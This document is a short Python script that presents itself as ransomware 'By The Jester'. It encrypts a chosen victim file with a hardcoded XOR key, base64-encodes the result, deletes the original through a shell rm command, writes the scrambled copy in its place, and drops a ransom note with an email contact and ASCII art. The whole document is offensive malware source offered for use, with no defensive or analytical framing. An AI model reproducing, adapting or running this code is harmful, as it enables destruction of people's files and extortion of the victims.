#!/usr/bin/python
# Ransomware By The Jester

import os
try:
    from Crypto.Cipher import XOR
except:
    os.system('pip install pycrypto')
import base64
import sys

key = 'matrix'
cipher = XOR.new(key)
file_path = 'CHANGE THIS' #Specify the file of the enemy you want to encrypt
openfile = open(file_path, 'rb')
readfile = openfile.read()
openfile.close()
encoding = base64.b64encode(cipher.encrypt(readfile))
os.system('rm '+file_path)
openfile2 = open(file_path,'wb')
openfile2.write(encoding)
openfile.close()

# ATTACK MESSAGE

fool=open("YOU_ARE_FUCKED.txt","w+") #you can change the file name
fool.write(r"""
YOU HAVE BEEN ATTACKED                                   
TO DECRYPT YOUR LOST FILE                                   
CONTACT > 'example@email.com'                                    
With email name: 'HELP ME'                                 
WAIT FOR FURTHER INSCRUCTIONS  

                         -dMm//o:
                       `h+:yds`:`      .-o+:-.
                        -o/hNN/`  +/-:`..`:s/:/+.
                  `-///::ddydMm+.::/o/:. `  .-/-s.
                `ohhhyso+//-/mNo-./+s/s/- `   ` +.
               -ydoy+::/:-/-+oNh/:.o/:+:. yy.` `.
             -/.dsy. `+s//++/:+h-.+o/://``dN// :-
             -`-ymh/ `/+s-+os:.yy+-..--..:hm+/-s.
             :`-:+yys.`:o+.-/-:ydyo/+-.`o:od//y/ `
             -//:.--hd+``-` `///yh/.-`s--:oyoos/ohoss-
               .d/`.:sd:/o`.:`..oy++syyhmNNdmdd+oy:sNd.
                -///:o+yo.-++oshhddNNNNMNNmydmhh/::oNN-
                  `:o+/+syyymNNMMNmmmdddhsyyys+oy--+yy-
                    ./sydhmNmNNNNNmNmmmddhyyyss/h/ `.`
                     .oyhhhdhddNNNmmNNNmmmmds+:+do
                     ....yyddmhdmmmdmNNmmmmmh::oy+
                     `.` -yssyy++hmyhdmhsshhho/oh/
                         :/.  `` `osomo:---`.+:yy`
                         +-.   *  `+oh/y.    :sh+
           `+.         ``oy//. ...`oss+ho   `yNss`    .`-o+`
      ```..ym/+/:.`   `.-/syyys+//.`.yhhdhdhhNNdh`  `/dy+so+-`.:`
     `ho/dy+/ooohhys+-`  -...:::+...`yNdyhNmmmms::oydyy/ ../++-ss-
     .yy:-`     `./ydmdo-://::..`.-..-ddmhddshdhdhy+-        ` :dy
      ./+.           .-:-.` ..:+.:ssssddNd:ymdyo-              ./+
                            `:-+/soymhdddy/..
                             ---/o+yysdsoo.``
                       `.:++/   ````..`.:yhhhy+-`
                  `.:+shyyo:.             .:ohhmdhs/.`
       --`--.:/+osyyyo:-`                     `./sdmdhhs/:.``
       -+++hhhy+/.`                                 ./ohmmmdhoys`
       .++s+``                                         `-+s:+m/         
                      Ransomware By The Jester
""")
fool.close()
